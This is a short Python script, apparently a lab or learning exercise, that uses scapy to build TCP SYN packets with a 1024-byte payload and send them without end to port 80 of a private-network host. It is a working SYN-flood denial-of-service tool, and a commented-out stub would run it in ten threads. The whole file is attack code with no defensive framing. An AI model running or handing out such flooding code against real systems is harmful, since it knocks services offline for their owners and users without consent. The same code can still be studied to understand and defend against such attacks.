
from scapy.all import TCP,IP,send,Raw
import threading,random

def syn_flood(my_ip, target_ip):

    packet=IP()/TCP()/Raw()

    #setting the IP layer
    packet[IP].src=my_ip
    packet[IP].dst=target_ip

    #setting the TCP layer
    packet[TCP].flags='S'
    packet[TCP].dport=80

    #setting the Raw layer
    raw = Raw(b"X"*1024)
    packet[Raw]=raw

    print(packet.show())

    while True:
       send(packet,verbose=0)


syn_flood('10.0.0.53','10.0.0.138')


#def multi_syn_flood():
#    for _ in range(10):
 #       thread=threading.Thread(target=syn_flood)
 #       thread.start()




